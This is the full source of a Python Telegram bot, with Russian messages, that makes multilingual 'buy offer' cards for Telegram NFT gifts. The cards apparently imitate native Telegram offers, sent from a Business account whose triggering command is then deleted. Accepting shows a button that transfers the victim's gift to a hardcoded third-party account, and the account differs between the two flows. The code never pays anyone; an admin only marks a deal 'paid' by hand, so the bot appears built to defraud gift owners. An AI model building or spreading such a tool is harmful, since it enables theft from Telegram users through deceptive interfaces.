import asyncio
import logging
import os
import re
import sqlite3
import uuid
import secrets
from datetime import datetime, timedelta, timezone
from urllib.parse import urlparse, unquote
from html import escape

from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command, CommandStart
from aiogram.types import (
    InlineQuery, InlineQueryResultArticle, InputTextMessageContent,
    InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, Message,
)
from dotenv import load_dotenv

load_dotenv()
BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
DB_PATH = os.getenv("DB_PATH", "offers.sqlite3")
RECIPIENT = "@XGiftRelayer"

if not BOT_TOKEN:
    raise RuntimeError("Укажите BOT_TOKEN в файле .env")

logging.basicConfig(level=logging.INFO)
bot = Bot(BOT_TOKEN)
dp = Dispatcher()


def db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    with db() as conn:
        conn.execute("""
            CREATE TABLE IF NOT EXISTS offers (
                id TEXT PRIMARY KEY,
                seller_id INTEGER NOT NULL,
                seller_username TEXT,
                gift_url TEXT NOT NULL,
                price INTEGER NOT NULL,
                language TEXT NOT NULL DEFAULT 'ru',
                status TEXT NOT NULL DEFAULT 'active',
                buyer_id INTEGER,
                buyer_username TEXT,
                inline_message_id TEXT,
                business_connection_id TEXT,
                business_chat_id INTEGER,
                business_message_id INTEGER,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        """)
        columns = {row[1] for row in conn.execute("PRAGMA table_info(offers)")}
        for name, sql_type in (
            ("language", "TEXT NOT NULL DEFAULT 'ru'"),
            ("business_connection_id", "TEXT"),
            ("business_chat_id", "INTEGER"),
            ("business_message_id", "INTEGER"),
        ):
            if name not in columns:
                conn.execute(f"ALTER TABLE offers ADD COLUMN {name} {sql_type}")
        conn.execute("""
            CREATE TABLE IF NOT EXISTS offer_codes (
                code TEXT PRIMARY KEY,
                offer_id TEXT NOT NULL,
                seller_id INTEGER NOT NULL,
                expires_at TEXT NOT NULL,
                used_at TEXT
            )
        """)


SUPPORTED_LANGUAGES = {"eng", "ru", "iran", "chin"}


def parse_offer(query: str, require_language: bool = False):
    parts = query.strip().split()
    if require_language and len(parts) != 3:
        return None
    if not require_language and len(parts) not in (2, 3):
        return None

    url, raw_price = parts[:2]
    language = parts[2].lower() if len(parts) == 3 else "ru"
    if language not in SUPPORTED_LANGUAGES:
        return None
    try:
        price = int(raw_price)
    except ValueError:
        return None

    parsed = urlparse(url)
    if (
        parsed.scheme != "https"
        or parsed.netloc.lower() not in {"t.me", "www.t.me"}
        or not parsed.path.startswith("/nft/")
        or len(parsed.path.split("/")) < 3
        or price < 1
        or price > 1_000_000
    ):
        return None
    return url, price, language


OFFER_TRANSLATIONS = {
    "eng": {
        "sender": "User",
        "offer": "offers You {price} stars for the gift - ",
        "expires": "This offer expires in 24h.",
        "accept": "Accept",
        "decline": "Decline",
    },
    "ru": {
        "sender": "Пользователь",
        "offer": "предлагает Вам {price} stars за подарок - ",
        "expires": "Предложение действует еще 24ч.",
        "accept": "Принять",
        "decline": "Отклонить",
    },
    "iran": {
        "sender": "کاربر",
        "offer": "به شما در ازای این هدیه {price} stars پیشنهاد می‌دهد - ",
        "expires": "این پیشنهاد تا ۲۴ ساعت دیگر معتبر است.",
        "accept": "پذیرفتن",
        "decline": "رد کردن",
    },
    "chin": {
        "sender": "用户",
        "offer": "向您出价 {price} stars 购买礼物 - ",
        "expires": "此报价将在 24 小时后失效。",
        "accept": "接受",
        "decline": "拒绝",
    },
}


def nft_display_name(url: str) -> str:
    slug = unquote(urlparse(url).path.rstrip("/").split("/")[-1])
    name, separator, token_id = slug.rpartition("-")
    return name if separator and token_id.isdigit() else slug


def localized_offer_text(url: str, price: int, sender_username: str | None, language: str):
    words = OFFER_TRANSLATIONS.get(language, OFFER_TRANSLATIONS["ru"])
    sender = f"@{sender_username}" if sender_username else words["sender"]
    return (
        f'<b>{escape(sender)}\n'
        f'{escape(words["offer"].format(price=price))}'
        f'<a href="{escape(url, quote=True)}">{escape(nft_display_name(url))}</a>\n\n'
        f'{escape(words["expires"])}</b>'
    )


def offer_keyboard(offer_id: str, language: str = "ru"):
    words = OFFER_TRANSLATIONS.get(language, OFFER_TRANSLATIONS["ru"])
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text=words["decline"], callback_data=f"decline:{offer_id}"),
        InlineKeyboardButton(text=words["accept"], callback_data=f"accept:{offer_id}")
    ]])


def offer_text(url: str, price: int, sender_username: str | None = None, language: str = "ru"):
    return localized_offer_text(url, price, sender_username, language)


def business_offer_keyboard(offer_id: str, language: str = "ru"):
    words = OFFER_TRANSLATIONS.get(language, OFFER_TRANSLATIONS["ru"])
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text=words["decline"], callback_data=f"bdecline:{offer_id}"),
        InlineKeyboardButton(text=words["accept"], callback_data=f"baccept:{offer_id}")
    ]])


def business_offer_text(url: str, price: int, sender_username: str | None = None, language: str = "ru"):
    return localized_offer_text(url, price, sender_username, language)


@dp.message(CommandStart())
async def start(message: Message):
    await message.answer(
        "Offer Bot готов!\n"
        "Чтобы создать оффер, отправь мне одной строкой ссылку на NFT, цену и язык:\n"
        "https://t.me/nft/ИМЯ_ПОДАРКА 500 ru\n"
        "Доступные языки:\n"
        "eng — английский\n"
        "ru — русский\n"
        "iran — персидский (иранский)\n"
        "chin — китайский\n"
        "После этого я выдам одноразовый код. Отправь его покупателю в формате !offer КОД."
    )


@dp.message(Command("myid"))
async def myid(message: Message):
    await message.answer(f"Твой Telegram ID: <code>{message.from_user.id}</code>")


@dp.message(Command("paid"))
async def paid(message: Message):
    if not ADMIN_ID or message.from_user.id != ADMIN_ID:
        await message.answer("Эта команда доступна только администратору.")
        return
    args = (message.text or "").split(maxsplit=1)
    if len(args) != 2:
        await message.answer("Использование: /paid ID_СДЕЛКИ")
        return

    offer_id = args[1].strip()
    with db() as conn:
        row = conn.execute("SELECT * FROM offers WHERE id=?", (offer_id,)).fetchone()
        if not row:
            await message.answer("Предложение не найдено.")
            return
        if row["status"] != "accepted":
            await message.answer(f"Нельзя отметить выплату: статус «{row['status']}».")
            return
        conn.execute("UPDATE offers SET status='paid' WHERE id=?", (offer_id,))

    await message.answer(f"Выплата для сделки {offer_id} отмечена как выполненная.")
    if row["inline_message_id"]:
        try:
            await bot.edit_message_text(
                inline_message_id=row["inline_message_id"],
                text=(
                    "🎁 NFT-предложение"
                    f'<a href="{escape(row["gift_url"], quote=True)}">Открыть NFT'
                    f"Цена: {row['price']} ⭐"
                    f"Получатель NFT: {RECIPIENT}"
                    "✅"
                ),
                parse_mode="HTML"
            )
        except Exception:
            logging.exception("Не удалось обновить inline-сообщение")


CODE_TTL_MINUTES = 30


@dp.message(F.text)
async def create_one_time_code(message: Message):
    if message.chat.type != "private" or not message.from_user or message.from_user.is_bot:
        return
    parsed = parse_offer(message.text or "", require_language=True)
    if not parsed:
        return
    url, price, language = parsed
    offer_id = uuid.uuid4().hex[:12]
    code = secrets.token_urlsafe(5).replace("-", "").replace("_", "").upper()[:8]
    expires = (datetime.now(timezone.utc) + timedelta(minutes=CODE_TTL_MINUTES)).isoformat()
    with db() as conn:
        while conn.execute("SELECT 1 FROM offer_codes WHERE code=?", (code,)).fetchone():
            code = secrets.token_hex(4).upper()
        conn.execute(
            """INSERT INTO offers (id,seller_id,seller_username,gift_url,price,language,status)
               VALUES (?,?,?,?,?,?,'code_issued')""",
            (offer_id, message.from_user.id, message.from_user.username, url, price, language)
        )
        conn.execute(
            "INSERT INTO offer_codes (code,offer_id,seller_id,expires_at) VALUES (?,?,?,?)",
            (code, offer_id, message.from_user.id, expires)
        )
    await message.answer(
        "Одноразовый код создан (действует 30 минут):\n\n"
        f"<code>!offer {code}</code>\n\n"
        f"Язык оффера: <code>{language}</code>. Скопируй команду нажатием и отправь покупателю в личный чат от своего подключённого Telegram Business-аккаунта.",
        parse_mode="HTML"
    )


@dp.business_message()
async def handle_business_message(message: Message):
    text = (message.text or "").strip()
    match = re.fullmatch(r"!offer\s+([A-Z0-9]{4,12})", text, flags=re.IGNORECASE)
    if not match or not message.business_connection_id or not message.from_user:
        return

    code = match.group(1).upper()
    now = datetime.now(timezone.utc).isoformat()

    with db() as conn:
        row = conn.execute(
            """SELECT c.code,c.offer_id,c.seller_id,c.expires_at,c.used_at,o.*
               FROM offer_codes c JOIN offers o ON o.id=c.offer_id
               WHERE c.code=?""", (code,)
        ).fetchone()

        if not row:
            logging.warning("Business offer: код %s не найден", code)
            return
        if row["seller_id"] != message.from_user.id:
            logging.warning("Business offer: отправитель не совпадает с владельцем кода %s", code)
            return
        if row["used_at"] is not None or row["status"] != "code_issued":
            logging.warning("Business offer: код %s уже использован или недоступен", code)
            return
        if row["expires_at"] <= now:
            conn.execute("UPDATE offers SET status='code_expired' WHERE id=?", (row["offer_id"],))
            logging.warning("Business offer: код %s просрочен", code)
            return

        conn.execute("UPDATE offer_codes SET used_at=? WHERE code=? AND used_at IS NULL", (now, code))
        conn.execute(
            "UPDATE offers SET status='business_sending' WHERE id=? AND status='code_issued'",
            (row["offer_id"],)
        )

    # Отправляем новую Business-карточку. Исходное сообщение !offer не редактируем.
    try:
        sent = await bot.send_message(
            chat_id=message.chat.id,
            business_connection_id=message.business_connection_id,
            text=business_offer_text(
                row["gift_url"], row["price"], row["seller_username"], row["language"]
            ),
            parse_mode="HTML",
            reply_markup=business_offer_keyboard(row["offer_id"], row["language"]),
            disable_web_page_preview=False
        )
    except Exception:
        logging.exception("Не удалось отправить Business-карточку для кода %s", code)
        with db() as conn:
            conn.execute("UPDATE offer_codes SET used_at=NULL WHERE code=?", (code,))
            conn.execute(
                "UPDATE offers SET status='code_issued' WHERE id=? AND status='business_sending'",
                (row["offer_id"],)
            )
        return

    with db() as conn:
        conn.execute(
            """UPDATE offers SET status='active',business_connection_id=?,
               business_chat_id=?,business_message_id=? WHERE id=?""",
            (message.business_connection_id, sent.chat.id, sent.message_id, row["offer_id"])
        )

    # Удаляем команду только после того, как карточка успешно отправлена.
    try:
        delete_method = getattr(bot, "delete_business_messages", None)
        if delete_method is None:
            logging.warning("В установленной версии aiogram нет delete_business_messages; команда останется в чате.")
        else:
            await delete_method(
                business_connection_id=message.business_connection_id,
                message_ids=[message.message_id]
            )
    except Exception:
        logging.exception("Карточка создана, но исходную команду !offer удалить не удалось")


def business_callback_target(row, callback: CallbackQuery):
    msg = callback.message
    if not msg or not row["business_connection_id"]:
        return None
    if msg.chat.id != row["business_chat_id"] or msg.message_id != row["business_message_id"]:
        return None
    return row["business_connection_id"], row["business_chat_id"], row["business_message_id"]


@dp.callback_query(F.data.startswith("baccept:"))
async def business_accept(callback: CallbackQuery):
    offer_id = callback.data.split(":", 1)[1]
    with db() as conn:
        row = conn.execute("SELECT * FROM offers WHERE id=?", (offer_id,)).fetchone()
        if not row or row["status"] != "active" or not row["business_connection_id"]:
            await callback.answer("Предложение уже обработано или недоступно.", show_alert=True)
            return
        target = business_callback_target(row, callback)
        if not target:
            await callback.answer("Не удалось подтвердить Business-сообщение.", show_alert=True)
            return
        if callback.from_user.id == row["seller_id"]:
            await callback.answer("Нельзя принять собственное предложение.", show_alert=True)
            return
        conn.execute(
            """UPDATE offers SET status='accepted',buyer_id=?,buyer_username=?
               WHERE id=? AND status='active'""",
            (callback.from_user.id, callback.from_user.username, offer_id)
        )

    connection_id, chat_id, message_id = target
    # Подтверждаем нажатие без всплывающего окна.
    await callback.answer()
    try:
        await bot.send_message(
            row["seller_id"],
            "🔔 Покупатель принял Business NFT-предложение.\n"
            f"Сделка: {offer_id}Цена: {row['price']} ⭐"
            f"Покупатель: {('@' + callback.from_user.username) if callback.from_user.username else 'без username'}"
        )
    except Exception:
        logging.info("Продавец ещё не открыл личный чат с ботом.")
    try:
        await bot.edit_message_reply_markup(
            chat_id=chat_id,
            message_id=message_id,
            business_connection_id=connection_id,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⏳ Ожидание подтверждения", callback_data="noop")],
                [InlineKeyboardButton(text="🎁 Передать подарок", url="tg://send_gift?to=XGiftRelayer")]
            ])
        )
    except Exception:
        logging.exception("Не удалось обновить клавиатуру Business-сообщения")


@dp.callback_query(F.data.startswith("bdecline:"))
async def business_decline(callback: CallbackQuery):
    offer_id = callback.data.split(":", 1)[1]
    with db() as conn:
        row = conn.execute("SELECT * FROM offers WHERE id=?", (offer_id,)).fetchone()
        if not row or row["status"] != "active" or not row["business_connection_id"]:
            await callback.answer("Предложение уже обработано.", show_alert=True)
            return
        target = business_callback_target(row, callback)
        if not target:
            await callback.answer("Не удалось подтвердить Business-сообщение.", show_alert=True)
            return
        conn.execute("UPDATE offers SET status='declined' WHERE id=? AND status='active'", (offer_id,))

    connection_id, chat_id, message_id = target
    await callback.answer("Предложение отклонено.")
    try:
        await bot.send_message(row["seller_id"], f"❌ Business-предложение {offer_id} отклонено.")
    except Exception:
        pass
    try:
        await bot.edit_message_reply_markup(
            chat_id=chat_id,
            message_id=message_id,
            business_connection_id=connection_id,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                InlineKeyboardButton(text="❌ Предложение отклонено", callback_data="noop")
            ]])
        )
    except Exception:
        logging.exception("Не удалось обновить клавиатуру отклонённого Business-сообщения")


@dp.inline_query()
async def inline_query(query: InlineQuery):
    parsed = parse_offer(query.query)
    if not parsed:
        result = InlineQueryResultArticle(
            id="usage",
            title="Создать NFT-предложение",
            description="Введи: ссылка на NFT, цена и язык (eng/ru/iran/chin)",
            input_message_content=InputTextMessageContent(
                message_text=(
                    "Чтобы создать предложение, введи после @aquaofferbot:\n"
                    "https://t.me/nft/ИМЯ_ПОДАРКА 500 ru"
                    "Языки: eng — английский, ru — русский, iran — персидский, chin — китайский."
                ),
                parse_mode="HTML"
            )
        )
        await query.answer([result], cache_time=1, is_personal=True)
        return

    url, price, language = parsed
    offer_id = uuid.uuid4().hex[:12]
    user = query.from_user

    with db() as conn:
        conn.execute(
            "INSERT INTO offers (id,seller_id,seller_username,gift_url,price,language) VALUES (?,?,?,?,?,?)",
            (offer_id, user.id, user.username, url, price, language)
        )

    result = InlineQueryResultArticle(
        id=offer_id,
        title=f"NFT-предложение — {price} ⭐",
        description=f"NFT → {RECIPIENT}",
        input_message_content=InputTextMessageContent(
            message_text=offer_text(url, price, user.username, language),
            parse_mode="HTML",
            disable_web_page_preview=False
        ),
        reply_markup=offer_keyboard(offer_id, language)
    )
    await query.answer([result], cache_time=0, is_personal=True)


@dp.callback_query(F.data.startswith("accept:"))
async def accept(callback: CallbackQuery):
    offer_id = callback.data.split(":", 1)[1]
    with db() as conn:
        row = conn.execute("SELECT * FROM offers WHERE id=?", (offer_id,)).fetchone()
        if not row:
            await callback.answer("Предложение не найдено.", show_alert=True)
            return
        if row["status"] != "active":
            await callback.answer("Это предложение уже обработано.", show_alert=True)
            return
        if callback.from_user.id == row["seller_id"]:
            await callback.answer("Нельзя принять собственное предложение.", show_alert=True)
            return

        conn.execute(
            """UPDATE offers
               SET status='accepted', buyer_id=?, buyer_username=?, inline_message_id=?
               WHERE id=? AND status='active'""",
            (callback.from_user.id, callback.from_user.username,
             callback.inline_message_id, offer_id)
        )

    # Подтверждаем нажатие без всплывающего окна.
    await callback.answer()

    try:
        await bot.send_message(
            row["seller_id"],
            "🔔 Покупатель принял NFT-предложение.\n"
            f"Сделка: <code>{offer_id}</code>\n"
            f"Цена: <b>{row['price']} ⭐</b>\n"
            f"Получатель NFT: <b>{RECIPIENT}</b>\n"
            f"Покупатель: {('@' + callback.from_user.username) if callback.from_user.username else 'без username'}"
        )
    except Exception:
        logging.info("Продавец ещё не открыл личный чат с ботом.")

    try:
        await bot.edit_message_reply_markup(
            inline_message_id=callback.inline_message_id,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⏳ Ожидание подтверждения", callback_data="noop")],
                [InlineKeyboardButton(text="🎁 Передать подарок", url="tg://send_gift?to=trezviyb")]
            ])
        )
    except Exception:
        logging.exception("Не удалось обновить кнопки inline-сообщения")


@dp.callback_query(F.data.startswith("decline:"))
async def decline(callback: CallbackQuery):
    offer_id = callback.data.split(":", 1)[1]
    with db() as conn:
        row = conn.execute("SELECT * FROM offers WHERE id=?", (offer_id,)).fetchone()
        if not row or row["status"] != "active":
            await callback.answer("Предложение уже обработано.", show_alert=True)
            return
        conn.execute("UPDATE offers SET status='declined' WHERE id=?", (offer_id,))

    await callback.answer("Предложение отклонено.")
    try:
        await bot.send_message(row["seller_id"], f"❌ Предложение <code>{offer_id}</code> отклонено.")
    except Exception:
        pass
    try:
        await bot.edit_message_reply_markup(
            inline_message_id=callback.inline_message_id,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                InlineKeyboardButton(text="❌ Предложение отклонено", callback_data="noop")
            ]])
        )
    except Exception:
        logging.exception("Не удалось обновить клавиатуру inline-сообщения")


@dp.callback_query(F.data == "noop")
async def noop(callback: CallbackQuery):
    await callback.answer("Статус предложения обновлён.")


async def main():
    init_db()
    await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())


if __name__ == "__main__":
    asyncio.run(main())
